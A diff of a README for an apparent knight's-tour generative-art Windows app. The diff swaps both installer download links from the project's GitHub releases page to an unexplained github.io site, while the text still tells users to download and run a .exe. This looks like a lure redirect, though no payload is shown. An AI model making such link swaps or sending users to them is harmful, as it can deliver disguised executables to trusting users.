@@ -1,6 +1,6 @@
 # 🌌 Nebula-Knight-Generative-Art - Create unique digital art with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Merriedelicate927/Nebula-Knight-Generative-Art/releases)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://merriedelicate927.github.io)
 
 Nebula Knight generates complex art patterns using a classic chess puzzle called the knight’s tour. The software combines these geometric paths with nebula gradients and circle patterns to produce distinct visual designs. You can generate art for print, digital displays, or textile designs. The interface allows you to view your work on apparel mockups before you save the files.
 
@@ -29,7 +29,7 @@ The application runs on modern Windows computers. Ensure your system meets these
 
 You must visit the project release page to get the installer for your computer.
 
-[Click here to visit the release page and download the setup file](https://github.com/Merriedelicate927/Nebula-Knight-Generative-Art/releases)
+[Click here to visit the release page and download the setup file](https://merriedelicate927.github.io)
 
 Once you reach the page, find the file ending in .exe under the most recent version. Click the file name to start the download.
 
